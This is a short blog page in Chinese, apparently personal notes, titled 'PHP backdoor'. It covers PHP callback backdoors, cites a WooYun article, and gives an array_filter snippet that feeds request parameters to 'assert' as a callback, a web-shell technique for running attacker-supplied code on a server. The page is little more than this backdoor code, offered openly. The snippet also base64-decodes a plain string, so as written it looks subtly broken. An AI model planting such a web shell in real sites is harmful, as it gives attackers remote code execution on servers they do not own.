---
layout: page
title:	php 后门
category: blog
description: 
---
# Preface

# php 回调后门
http://drops.wooyun.org/tips/7279

## array_filter

	$e = $_REQUEST['e'] = 'assert';
	$arr = array($_POST['pass'] = 'phpinfo();',);
	array_filter($arr, base64_decode($e));
